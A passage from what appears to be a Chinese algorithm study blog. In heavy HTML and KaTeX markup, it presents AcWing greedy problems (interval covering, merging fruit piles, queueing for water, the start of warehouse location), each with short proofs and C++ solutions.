style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span> 以及一个线段区间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>s</mi><mo separator="true">,</mo><mi>t</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[s,t]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">t</span><span class="mclose">]</span></span></span></span>，请你选择尽量少的区间，将指定线段区间完全覆盖。</p><p>输出最少区间数，如果无法完全覆盖则输出 −1。</p><p><strong>输入格式</strong></p><p>第一行包含两个整数 s 和 t，表示给定线段区间的两个端点。</p><p>第二行包含整数 N，表示给定区间数。</p><p>接下来 N 行，每行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo separator="true">,</mo><mtext> </mtext><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i,\ b_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，表示一个区间的两个端点。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示所需最少区间数。</p><p>如果无解，则输出 −1。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1\le N \le 10^5,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>≤</mo><mi>a</mi><mo>≤</mo><mi>b</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">-10^9\le a\le b\le 10^9,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>≤</mo><mi>a</mi><mo>≤</mo><mi>b</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9\le a\le b\le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 5</span><br><span class="line">3</span><br><span class="line">-1 3</span><br><span class="line">2 4</span><br><span class="line">3 5</span><br></pre></td></tr></table></figure><p><strong>输出样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="贪心-4">贪心</h3><p><strong>做法</strong></p><ol><li>将所有区间按左端点从小到大排序</li><li>从前往后枚举每个区间<br>在所有能覆盖start的区间中，选择右端点最大的区间<br>然后将start更新为右端点的最大值</li></ol><p><strong>证明</strong></p><ol><li><p>ans &lt;= cnt 合法且ans为…</p></li><li><p>ans &gt;= cnt</p><blockquote><p>调整法：找到ans对应选择的区间与cnt对应区间的第一个不同的区间，一定能将ans中这个区间替换为cnt方案中的区间，替换后循环下去…<br>最后ans对应方案和cnt中完全一致</p></blockquote></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Range</span> &#123;</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Range &amp;W) <span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> l &lt; W.l;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;ranges[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> st, ed;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;st, &amp;ed);</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;ranges[i].l, &amp;ranges[i].r);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(ranges, ranges + n);</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="type">bool</span> success = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="type">int</span> j = i, r = <span class="number">-2e9</span>;</span><br><span class="line">    <span class="keyword">while</span> (j &lt; n &amp;&amp; ranges[j].l &lt;= st) &#123;</span><br><span class="line">      r = <span class="built_in">max</span>(r, ranges[j].r);</span><br><span class="line">      j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (r &lt; st) &#123;</span><br><span class="line">      res = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res++;</span><br><span class="line">    <span class="keyword">if</span> (r &gt;= ed) &#123;</span><br><span class="line">      success = <span class="literal">true</span>;  <span class="comment">// 一定要success, 循环结束后可能还没覆盖ed</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    st = r;</span><br><span class="line">    i = j - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!success) res = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Huffman树">Huffman树</h1><h2 id="AcWing-148-合并果子">AcWing 148. 合并果子</h2><blockquote><p>与DP章中“合并石子”不同指出在于：合并石子必须是相邻两堆，而合并果子可以不相邻。</p></blockquote><p>在一个果园里，达达已经将所有的果子打了下来，而且按果子的不同种类分成了不同的堆。</p><p>达达决定把所有的果子合成一堆。</p><p>每一次合并，达达可以把两堆果子合并到一起，消耗的体力等于两堆果子的重量之和。</p><p>可以看出，所有的果子经过 n−1 次合并之后，就只剩下一堆了。</p><p>达达在合并果子时总共消耗的体力等于每次合并所耗体力之和。</p><p>因为还要花大力气把这些果子搬回家，所以达达在合并果子时要尽可能地节省体力。</p><p>假定每个果子重量都为 1，并且已知果子的种类数和每种果子的数目，你的任务是设计出合并的次序方案，使达达耗费的体力最少，并输出这个最小的体力耗费值。</p><p>例如有 3 种果子，数目依次为 1，2，9。</p><p>可以先将 1、2 堆合并，新堆数目为 3，耗费体力为 3。</p><p>接着，将新堆与原先的第三堆合并，又得到新的堆，数目为 12，耗费体力为 12。</p><p>所以达达总共耗费体力=3+12=15。</p><p>可以证明 15 为最小的体力耗费值。</p><p><strong>输入格式</strong></p><p>输入包括两行，第一行是一个整数 n，表示果子的种类数。</p><p>第二行包含 n 个整数，用空格分隔，第 i 个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是第 i 种果子的数目。</p><p><strong>输出格式</strong></p><p>输出包括一行，这一行只包含一个整数，也就是最小的体力耗费值。</p><p>输入数据保证这个值小于 231。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>b</mi><mo>≤</mo><mn>10000</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1\le b\le 10000,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">10000</span><span class="mpunct">,</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><msub><mi>a</mi><mi>i</mi></msub><mo>≤</mo><mn>20000</mn></mrow><annotation encoding="application/x-tex">1\le a_i\le 20000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">20000</span></span></span></span></p><p><strong>输入样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3 </span><br><span class="line">1 2 9 </span><br></pre></td></tr></table></figure><p><strong>输出样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15</span><br></pre></td></tr></table></figure><h3 id="贪心-5">贪心</h3><p><strong>做法</strong></p><p>每次选择重量最小的2堆合并</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; heap;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">    heap.<span class="built_in">push</span>(x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (heap.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">int</span> a = heap.<span class="built_in">top</span>(); heap.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="type">int</span> b = heap.<span class="built_in">top</span>(); heap.<span class="built_in">pop</span>();</span><br><span class="line">    res += (a + b);</span><br><span class="line">    heap.<span class="built_in">push</span>(a + b);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, res);  <span class="comment">// %lld</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="排序不等式">排序不等式</h1><h2 id="AcWing-913-排队打水">AcWing 913. 排队打水</h2><p>有 n 个人排队到 1 个水龙头处打水，第 i 个人装满水桶所需的时间是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">t_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，请问如何安排他们的打水顺序才能使所有人的等待时间之和最小？</p><p><strong>输入格式</strong></p><p>第一行包含整数 n。</p><p>第二行包含 n 个整数，其中第 i 个整数表示第 i 个人装满水桶所花费的时间 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">t_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最小的等待时间之和。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1\le n\le 10^5,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><msub><mi>t</mi><mi>i</mi></msub><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>4</mn></msup></mrow><annotation encoding="application/x-tex">1\le t_i\le 10^4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7</span><br><span class="line">3 6 1 4 2 5 7</span><br></pre></td></tr></table></figure><p><strong>输出样例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">56</span><br></pre></td></tr></table></figure><h3 id="贪心-6">贪心</h3><p><strong>做法</strong> 用时短的放在前面。（结合公式 + 调整法易证）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(a, a + n);</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="comment">// 下标为i的第(i+1)个人后会有(n-i-1)个人需要等这个a[i]时间</span></span><br><span class="line">    res += a[i] * (n - i - <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="绝对值不等式">绝对值不等式</h1><h2 id="AcWing-104-货仓选址">AcWing 104. 货仓选址</h2><p>在一条数轴上有 N 家商店，它们的坐标分别为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub><mo>∼</mo><msub><mi>A</mi><mi>N</mi></msub></mrow><annotation encoding="application/x-tex">A_1\sim A_N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" 